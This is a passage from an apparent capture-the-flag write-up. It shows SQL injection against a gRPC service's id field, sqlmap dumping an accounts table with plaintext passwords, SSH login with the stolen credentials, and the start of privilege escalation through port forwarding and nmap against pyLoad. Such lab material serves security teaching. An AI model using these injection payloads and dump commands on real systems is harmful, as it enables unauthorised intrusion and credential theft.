+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>x-grpcui-csrf-token<span style="color:#f92672">:</span> <span style="color:#ae81ff">lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">same-origin</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">cors</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">empty</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013/</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">_grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;metadata&#34;</span>:[{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;token&#34;</span>,<span style="color:#f92672">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY&#34;</span>}],<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;517&#34;</span>}]}
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sun, 03 Sep 2023 19:31:06 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;headers&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;content-type&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;application/grpc&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;grpc-accept-encoding&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;identity, deflate, gzip&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;error&#34;</span>: <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;responses&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;message&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Will update soon.&#34;</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;isError&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;requests&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;total&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;sent&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;trailers&#34;</span>: []
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I add in the id field an <code>apex</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /invoke/SimpleApp.getInfo <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">191</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>x-grpcui-csrf-token<span style="color:#f92672">:</span> <span style="color:#ae81ff">lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">same-origin</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">cors</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">empty</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013/</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">_grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;metadata&#34;</span>:[{<span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;token&#34;</span>,<span style="color:#f92672">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY&#34;</span>}],<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;517&#39;&#34;</span>}]}
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sun, 03 Sep 2023 19:34:51 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">364</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;headers&#34;</span>: [],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;error&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;code&#34;</span>: <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;Unknown&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Unexpected \u003cclass &#39;TypeError&#39;\u003e: bad argument type for built-in operation&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;details&#34;</span>: []
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;responses&#34;</span>: <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;requests&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;total&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;sent&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;trailers&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;content-type&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;application/grpc&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It can be vulnerable to <code>SQL injection</code>, so I save the request and pass it to <code>sqlmap</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sqlmap -r req.txt -p id --batch --dump
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__                                                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span>,<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.7.6#stable<span style="color:#f92672">}</span>                                                                                                                                                                                                 
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[)]</span>     | .<span style="color:#e6db74">&#39;| . |                                                                                                                                                                                                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                             
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage caused by this program
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting @ 15:53:33 /2023-09-03/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> parsing HTTP request from <span style="color:#e6db74">&#39;req.txt&#39;</span>
+</span></span><span style="display:flex;"><span>JSON data found in POST body. Do you want to process it? <span style="color:#f92672">[</span>Y/n/q<span style="color:#f92672">]</span> Y
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> resuming back-end DBMS <span style="color:#e6db74">&#39;sqlite&#39;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
+</span></span><span style="display:flex;"><span>sqlmap resumed the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> from stored session:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: JSON id <span style="color:#f92672">((</span>custom<span style="color:#f92672">)</span> POST<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>    Payload: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;token&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY&#34;</span><span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;517 AND 7623=7623&#34;</span><span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: time-based blind
+</span></span><span style="display:flex;"><span>    Title: SQLite &gt; 2.0 AND time-based blind <span style="color:#f92672">(</span>heavy query<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;token&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY&#34;</span><span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;517 AND 4771=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))&#34;</span><span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: UNION query
+</span></span><span style="display:flex;"><span>    Title: Generic UNION query <span style="color:#f92672">(</span>NULL<span style="color:#f92672">)</span> - <span style="color:#ae81ff">3</span> columns
+</span></span><span style="display:flex;"><span>    Payload: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;token&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY&#34;</span><span style="color:#f92672">}]</span>,<span style="color:#e6db74">&#34;data&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;id&#34;</span>:<span style="color:#e6db74">&#34;-5023 UNION ALL SELECT CHAR(113,120,112,113,113)||CHAR(74,66,85,121,69,68,98,97,89,66,87,105,67,86,70,109,77,77,105,69,65,109,80,99,100,101,81,118,71,76,81,77,103,66,107,115,104,103,74,103)||CHAR(113,112,98,107,113)-- WsBU&#34;</span><span style="color:#f92672">}]}</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is SQLite
+</span></span><span style="display:flex;"><span>back-end DBMS: SQLite
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching tables <span style="color:#66d9ef">for</span> database: <span style="color:#e6db74">&#39;SQLite_masterdb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching columns <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;accounts&#39;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching entries <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;accounts&#39;</span>
+</span></span><span style="display:flex;"><span>Database: &lt;current&gt;
+</span></span><span style="display:flex;"><span>Table: accounts
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">3</span> entries<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+------------------------+----------+
+</span></span><span style="display:flex;"><span>| password               | username |
+</span></span><span style="display:flex;"><span>+------------------------+----------+
+</span></span><span style="display:flex;"><span>| admin                  | admin    |
+</span></span><span style="display:flex;"><span>| HereIsYourPassWord1431 | sau      |
+</span></span><span style="display:flex;"><span>| anon                   | anon3    |
+</span></span><span style="display:flex;"><span>+------------------------+----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> table <span style="color:#e6db74">&#39;SQLite_masterdb.accounts&#39;</span> dumped to CSV file <span style="color:#e6db74">&#39;/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:34<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching columns <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;messages&#39;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:35<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching entries <span style="color:#66d9ef">for</span> table <span style="color:#e6db74">&#39;messages&#39;</span>
+</span></span><span style="display:flex;"><span>Database: &lt;current&gt;
+</span></span><span style="display:flex;"><span>Table: messages
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> entries<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+-----+----------------------------------------------+----------+
+</span></span><span style="display:flex;"><span>| id  | message                                      | username |
+</span></span><span style="display:flex;"><span>+-----+----------------------------------------------+----------+
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1</span>   | The admin is working hard to fix the issues. | admin    |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">749</span> | Will update soon.                            | anon3    |
+</span></span><span style="display:flex;"><span>+-----+----------------------------------------------+----------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:35<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> table <span style="color:#e6db74">&#39;SQLite_masterdb.messages&#39;</span> dumped to CSV file <span style="color:#e6db74">&#39;/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>15:53:35<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/kali/.local/share/sqlmap/output/127.0.0.1&#39;</span>
+</span></span></code></pre></div><p>I have find the <code>credentials</code>:</p>
+<pre tabindex="0"><code>sau:HereIsYourPassWord1431
+</code></pre><p>I login to ssh like sau and I find the <code>user flag</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ ssh sau@10.10.11.214                  
+The authenticity of host &#39;10.10.11.214 (10.10.11.214)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.11.214&#39; (ED25519) to the list of known hosts.
+sau@10.10.11.214&#39;s password: 
+Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
+sau@pc:~$ whoami
+sau
+sau@pc:~$ ls -all
+total 28
+drwxr-xr-x 3 sau  sau  4096 Jan 11  2023 .
+drwxr-xr-x 3 root root 4096 Jan 11  2023 ..
+lrwxrwxrwx 1 root root    9 Jan 11  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 sau  sau   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 sau  sau  3771 Feb 25  2020 .bashrc
+drwx------ 2 sau  sau  4096 Jan 11  2023 .cache
+-rw-r--r-- 1 sau  sau   807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root    9 Jan 11  2023 .viminfo -&gt; /dev/null
+-rw-r----- 1 root sau    33 Sep  3 18:43 user.txt
+sau@pc:~$ cat user.txt
+1cc09011589ad540cec5c2ed6f6d134f
+sau@pc:~$ 
+</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see a strange port open(<code>8000</code>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sau@pc:/var$ netstat -antp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
+</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>servers and established<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">360</span> 10.10.11.214:22         10.10.14.148:34178      ESTABLISHED -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::50051                :::*                    LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 10.10.11.214:50051      10.10.14.148:55410      ESTABLISHED -  
+</span></span></code></pre></div><p>I do the <code>Port Forwarding</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh -L 1234:localhost:8000 sau@10.10.11.214       
+</span></span><span style="display:flex;"><span>sau@10.10.11.214<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Last login: Sun Sep  <span style="color:#ae81ff">3</span> 19:56:06 <span style="color:#ae81ff">2023</span> from 10.10.14.148
+</span></span></code></pre></div><p>I do a <code>nmap</code> scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 127.0.0.1 -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-09-03 16:26 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> localhost <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00020s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>1234/tcp open  http    CherryPy wsgiserver
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>|_http-server-header: Cheroot/8.6.0
+</span></span><span style="display:flex;"><span>| http-title: Login - pyLoad 
+</span></span><span style="display:flex;"><span>|_Requested resource was /login?next<span style="color:#f92672">=</span>http%3A%2F%2Flocalhost%3A1234%2F
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
